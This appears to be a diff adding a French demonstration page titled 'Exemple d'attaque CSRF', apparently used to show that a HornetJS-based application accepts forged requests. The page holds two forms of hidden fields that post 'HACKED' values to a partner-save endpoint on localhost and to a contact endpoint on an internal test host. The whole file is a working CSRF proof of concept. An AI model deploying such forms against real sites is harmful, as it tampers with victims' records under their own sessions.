@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html dir="ltr" lang="fr" class="server-side usejs">
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, user-scalable=no">
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<link rel="icon" type="image/png" href="http://localhost:7777/5.0.0/intranet/img/logo.png">
+<title>
+Exemple d'attaque CSRF</title>
+<link rel="stylesheet" type="text/css" href="http://localhost:7777/5.0.0/intranet/css/theme.css">
+</head>
+<body>
+<form class="" method="post" action="http://localhost:8888/services/partenaires/sauvegarder/56">
+<input type="hidden" name="id" id="id" value="56">
+<input type="hidden" name="civilite" id="civilite" value="1" >
+<input type="hidden" name="isVIP" id="isVIP" value="true" >
+<input type="hidden" name="nom" id="nom" value="HACKED">
+<input type="hidden" name="nomLocal" id="nomLocal" value="HACKED">
+<input type="hidden" name="prenom" id="prenom" value="HACKED">
+<input type="hidden" name="prenomLocal" id="prenomLocal" value="HACKED">
+<input type="hidden" name="nationalite" value="62">
+<input type="hidden" name="organisme" id="organisme" value="HACKED">
+<input type="hidden" name="fonction" id="fonction" value="HACKED">
+<input type="hidden" name="proTelFixe" id="proTelFixe" value="0101010101">
+<input type="hidden" name="proTelPort" id="proTelPort" value="0101010101">
+<input type="hidden" name="proCourriel" id="proCourriel" value="hacked.hacked@msn.com">
+<input type="hidden" name="proFax" id="proFax">
+<input type="hidden" name="pays" id="pays" value="62">
+<input type="hidden" name="ville" id="ville" value="2664">
+<input type="hidden" name="proAdrRue" id="proAdrRue" value="666 impasse hacked">
+<input type="hidden" name="proAdrCP" id="proAdrCP" value="99999">
+<input type="hidden" name="assistNom" id="assistNom" value="HACKED">
+<input type="hidden" name="assistPrenom" id="assistPrenom" value="HACKED">
+<input type="hidden" name="assistTel" id="assistTel" value="HACKED">
+<input type="hidden" name="assistCourriel" id="assistCourriel" value="HACKED">
+<button type="submit" id="envoi" name="action:envoi" value="Valider" class="hornet-button">OH le zolie bouton (je pointe vers localhost)</button>
+</form>
+
+<form class="" method="post" action="http://rec-app-hornetjs-nts/services/contact/envoyer">
+<input type="hidden" name="nom" id="nom" value="HACKED">
+<input type="hidden" name="prenom" id="prenom" value="HACKED">
+<input type="hidden" name="mail" id="mail" value="hacked@hacked.com">
+<input type="hidden" name="message" id="message" value="Je suis sensible aux attaques CSRF, c'est dommage n'est-ce pas ?">
+<button type="submit" id="envoi" name="action:envoi" value="Valider" class="hornet-button">OH le zolie 2eme bouton (je pointe vers rec-app-hornetjs-nts)</button>
+</form>
+
+
+</body>
+</html>
